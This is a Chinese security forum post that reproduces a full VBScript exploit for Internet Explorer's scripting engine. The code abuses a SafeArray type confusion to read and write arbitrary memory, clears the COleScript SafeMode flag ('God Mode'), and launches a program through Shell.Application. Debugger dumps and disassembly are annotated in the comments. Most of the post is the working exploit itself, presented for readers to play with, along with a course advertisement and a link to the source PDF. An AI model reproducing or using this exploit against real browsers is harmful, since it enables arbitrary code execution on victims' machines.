
# VBScript Exploit 示例

```vb
<script type="text/javascript" language="VBScript">

Class Exploit

Private m_Address

Private m_Array()

Private m_Index

Private Sub Class_Initialize

m_Address = &H08000020

ReDim m_Array((&H08000000 - 32) / 16 - 1)

' first dim a big array.

Fake = Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uFFFF%u7FFF%u0000%u0000")

' this code we use to do type confusion
' we compare to the SafeArray structure, the pVData is point to the 0x00000000,
0x7fffffff is the cElements, if we treat this as a array, we can use to access from 0 
0x7fffffff is the cElements, if we treat this as a array, we can use to access from 0
to 0x7fffffff.

For i = 0 To UBound(m_Array) Step (65536 / 16)
m_Array(i) = Fake
Next
End Sub

Public Sub WriteDword(Address, Value)
' after the type confusion, m_Array(m_Index)[] will be a array.
m_Array(m_Index)(Address - 8) = CLng(Value)
End Sub

Private Function ReadDword(Address)
m_Array(m_Index + 10) = Address + 4
'change the vt to vbString.
WriteDword m_Address + 10 * 16, vbString
'then get the length of the string. we know the BSTR str's structure, the first four
bytes is the length. so it will get the first four bytes value.
ReadDword = LenB(m_Array(m_Index + 10))
'then change the vt to the original value.
WriteDword m_Address + 10 * 16, vbLong
End Function

Public Sub Go()
MsgBox "ed 08000020 200C"
For i = 0 To UBound(m_Array) Step (65536 / 16)
If VarType(m_Array(i)) = (vbArray + vbVariant) Then
m_Index = i
Exit For
End If
Next
On Error Resume Next
m_Array(m_Index + 1) = Go
' In the vb engine, it first get the Go var, then check the type, if is a function,
' then check if is a sub, if yes, it will not to place into the array.
m_Array(m_Index + 1) = Null
' it check the Null var, when we get the Null var, it from the virtual stack, and
this stack stores the Go var before, and it not clear.
' here, it just update the vt type, other things is the same.
' for example this is the Go func var
' 0:000> dd 04353f50
' 04353f50 0435004c 04353f90 016aefe0 0012e080
' after we get the Null var, the value is
' 0:000> dd 04353f50
' 04353f50 04350001 04353f90 016aefe0 0012e080
' we see it only update the vt flag. from the 0x4c(func) to 0x01(Null).
'.text:73271E6C loc_73271E6C: ; CODE XREF: CScriptRuntime::RunNoEH(VAR *)+61j
'.text:73271E6C ; DATA XREF: .text:off_73272C96o
'.text:73271E6C lea eax, [ebx+0B0h] ; jumptable 73272EBC case 18
'.text:73271E72 add dword ptr [eax], 0FFFFFFF0h
'.text:73271E75 mov eax, [eax]
'.text:73271E77 mov word ptr [eax], 1 //
CScriptEntryPoint = ReadDword(m_Address + 16 + 8)
' this is point to a CScriptEntryPoint
' 0:003> dd 08000020
' 08000020 0000200c 00344000 0d21efe4 0012e154
' 08000020 0000200c 00344000 0d21efe4 0012e154
' 08000030 04350001 04353f90 016aefe0 0012e080
COleScript = ReadDword(ReadDword(CScriptEntryPoint + 8) + 16)
' in the CScriptEntryPoint from 8 is a FuncInfo structure.
' 0:003> dd 016aefe0
' 016aefe0 73274e68 00000003 (0434bfd8) 04346050
' 016aeff0 04347db8 00000000 0434bfd8 04314f88
'0:003> dd 0434bfd8
'0434bfd8 00000009 00000000 00000000 00000000
'0434bfe8 0430ce00 00000000 0430cfd4 04349ff8
'0434bff8 04346050 04346050 ???????? ????????
'from 0x10, we will find the COleScript
'0:003> dd 0430ce00
'0430ce00 732747b0 732751a8 73275420 73275554
'0430ce10 7327553c 73275528 73275518 732754e4
'0430ce20 732754d4 732754c4 732754b4 7327549c
'0430ce30 7327540c 7327548c 73275474 73275460
'0430ce40 73275450 00000000 00000000 00000008
'0430ce50 00000001 00000001 03638300 732cbda4
'0430ce60 7327c2ec 00000804 00000804 00000804
'0430ce70 00000804 00000001 000003a8 0000a000
Select Case ScriptEngineMinorVersion
Case 1 SafeMode = COleScript + &H134
Case 5 SafeMode = COleScript + &H138
Case 6 SafeMode = COleScript + &H168
Case 7 SafeMode = COleScript + &H174 ' mov eax, [ecx+174h], in my environment,
verion=7
Case 8 SafeMode = COleScript + &H174
End Select
' Now clear the SafeMode.
WriteDword SafeMode, 0
Set Object = CreateObject("Shell.Application")
Object.ShellExecute "calc"
End Sub

End Class

Set Target = New Exploit
Target.Go

</script>
```

好好玩玩吧，别玩坏就行了。

注：本帖由看雪论坛志愿者PEstone 借助 11楼 **张jialin** 的翻译重新将文档整理排版，若和原文有出入，以原作者附件为准

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

上传的附件：

- [secniu.com-How_to_use_VBScript_to_turn_on_the_God_Mode.pdf](javascript:void(0);)
  （46.07kb，326次下载）
